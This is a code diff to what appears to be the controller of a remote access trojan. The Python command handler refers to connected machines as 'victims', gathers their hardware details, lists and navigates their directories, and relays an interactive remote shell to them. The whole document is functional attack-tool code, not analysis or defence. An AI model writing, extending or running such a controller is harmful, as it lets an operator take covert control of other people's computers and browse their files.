@@ -11,8 +11,11 @@
 # **************************************************************************** #
 
 import threading
+import time
 import json
 import sys
+
+from client import Client
 
 class Command:
 	def __init__(self, server) -> None:
@@ -23,26 +26,31 @@ class Command:
 	def command(self, command_name: str, args: list) -> None:
 		print("\n")
 		command_list = dir(self)
-		
+
+		if (command_name == "use"):
+			return self.use(args)
+
+		client = self.server.getClient()
+		if (not client):
+			return
+
 		if command_name in command_list:
-			getattr(self, command_name)(args)
+			getattr(self, command_name)(args, client)
 
 	def use(self, args: list) -> None:
 		if len(args) == 0:
-			print("Usage: use <client_id>")
+			self.server.printer.info("Usage: use <client_id>\n")
 			return
 
 		client_id = int(args[0])
-		if client_id >= len(self.server.clients):
-			print("Invalid client_id")
+		if (not self.server.getClient(client_id)):
 			return
 
 		self.server.client_id = client_id
-		print(f"Using client {client_id}\n")
+		self.server.printer.info(f"Using client {client_id}\n")
 
-	def information(self, args: list) -> None:
-		client = self.server.clients[self.server.client_id]
-		client.sendData("command", ["information", []])
+	def info(self, args: list, client: Client) -> None:
+		client.sendData("command", ["info", []])
 
 		printer = self.server.printer
 		
@@ -59,24 +67,72 @@ class Command:
 		printer.info(f" - Processor: {info['processor']}")
 		printer.info(f" - RAM: {info['ram']}")
 
-
 		print("\n")
 
-	def list(self, args: list) -> None:
-		before_id = self.server.client_id
+	def list(self, args: list, client: Client) -> None:
+		offset = 0
 
 		for id in range(0, len(self.server.clients)):
-			self.server.client_id = id
-			self.information([])
+			victim = self.server.getClient(id - offset, error=False)
+			self.info([], victim)
 
-		self.server.client_id = before_id
-	def shell(self, args: list) -> None:
-		victim = self.server.clients[self.server.client_id]
-		victim.sendData("command", ["shell", []])
+			if (not victim.connected):
+				offset += 1
+
+
+	def cd(self, args: list, client: Client) -> None:
+		path = "~"
+		if (len(args) != 0):
+			path = args[0]
+
+		client.sendData("command", ["cd", path])
+		
+		response = client.recv()
+		if (not response):
+			return
+
+		response = json.loads(response)
+		if (response["success"]):
+			client.path = response["path"]
+		else:
+			self.server.printer.bad("Path does not exist")
+
+	def ls(self, args: list, client: Client) -> None:
+		path = None
+		if (len(args) != 0):
+			path = args[0]
+		client.sendData("command", ["ls", path])
+
+		if (path == None):
+			path = client.path
+		self.server.printer.info(f"{path}: ")
+		
+		response = client.recv()
+		if (not response):
+			return
+
+		response = json.loads(response)
+		response = dict(sorted(response.items(), key=lambda x: x[1]["directory"], reverse=True))
+
+		for dir in response.keys():
+			stats = response[dir]
+			print(f"  {time.ctime(stats['time'])}\t", end="")
+			if (dir.startswith(".")):
+				self.server.printer.lightblue(dir)
+			elif (stats["directory"]):
+				self.server.printer.cyan(dir + "\\")
+			else:
+				self.server.printer.lightwhite(dir)
+		
+		print("\n")
+
+
+	def shell(self, args: list, client: Client) -> None:
+		client.sendData("command", ["shell", []])
 
 		def receive_shell():
 			while True:
-				response = victim.recv(decoding="cp850")
+				response = client.recv(decoding="cp850")
 				if not response or response == "EXIT":
 					break
 				print(response, end="")
@@ -87,7 +143,7 @@ class Command:
 		has_sent = True
 		while has_sent:
 			command = input()
-			has_sent = victim.send(command)
+			has_sent = client.send(command)
 			
 			if command == "EXIT":
 				break
